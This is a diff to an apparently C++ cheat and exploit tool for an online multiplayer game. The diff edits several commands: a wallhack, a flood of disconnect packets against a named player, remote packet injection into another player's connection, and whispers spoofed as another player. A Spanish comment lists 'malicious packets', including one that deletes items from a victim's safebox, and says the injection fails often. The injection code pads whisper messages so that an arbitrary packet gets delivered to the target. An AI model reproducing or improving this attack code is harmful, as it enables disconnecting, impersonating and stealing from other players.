@@ -19,7 +19,7 @@ const map<string, string> Command::help_msgs = {
 	{"wallhack", "Enable or disable the wallhack. Syntax: wallhack 0/1"},
 	{"dc", "Start trying to disconnect the player. It sends by default 20 dc packets. Syntax: dc player [packets]"},
 	{"dc_stop", "Stop trying to disconnect the player. Syntax: dc_stop"},
-	{"inj", "Perform remote packet injection on player. Syntax: inj player hexbuf"},
+	{"inj", "Perform remote packet injection on player. Works bad. Syntax: inj player hexbuf"},
 	{"whisp", "Send a message to a player as if it had been sent by another player. Uses packet injection. Syntax: whisp type to_player from_player msg"}
 };
 Command* const Command::instance = new Command();
@@ -194,11 +194,16 @@ void Command::_packet_injection(const string& username, Packet* p){
 
 	Me rindo
 
+	Además de no poder nullbytes, falla más que las escopetillas de la feria. Parece que la
+	tasa de acierto varía entre channel xd? No parece ser explotable de manera fiable
+
 	[MALICIOUS PACKETS]
 		- Whisper
 		- Phase: "\xFD\x01"
 		- Delete from safebox: "\x56\x01"
 	*/
+
+
 	string p_buf = p->get_buf();
 	cout << "Performing packet injection to " << username << endl;
 	cout << "[MALICIOUS PACKET] " << string_to_hex(p_buf) << endl;
@@ -211,8 +216,8 @@ void Command::_packet_injection(const string& username, Packet* p){
 	for (i = 0; i < INJECTION_PACKET_COUNT; i++)
 		buf += CG_Whisper(username, to_string(i) + string(INJECTION_PACKET_LEN, c++) + to_string(i)).get_buf();
 
-	// packet																							   //string packet = hex_to_string("222101014B6C65636B616161616161616161616161616161616161616141414141");
-	buf += CG_Whisper(username, to_string(i) + string(78, c) + p_buf).get_buf(); // string(500-78-packet.length(), c++) + to_string(i)).get_buf();
+	// packet
+	buf += CG_Whisper(username, to_string(i) + string(78, c) + p_buf).get_buf();
 
 	// Valid packet after malicious packet
 	c++;
@@ -318,9 +323,12 @@ void Command::run(const string& _cmd){
 		instance->disconnecting = false;
 
 	} else if (cmd[0] == "whisp"){
-		if (check = check_n_args(4, cmd))
-			whisper(stoi(cmd[1]), cmd[2], cmd[3], cmd[4]);
-		// TODO. Hacer una func a la que se le pase un paquete y lo inyecte
+		if (check = check_n_args(4, cmd)){
+			string msg;
+			for (auto it = cmd.begin()+4; it != cmd.end(); ++it)
+				msg += *it + " ";
+			whisper(stoi(cmd[1]), cmd[2], cmd[3], msg);
+		}
 
 	} else if (cmd[0] == "inj") {
 		if (check = check_n_args(2, cmd))
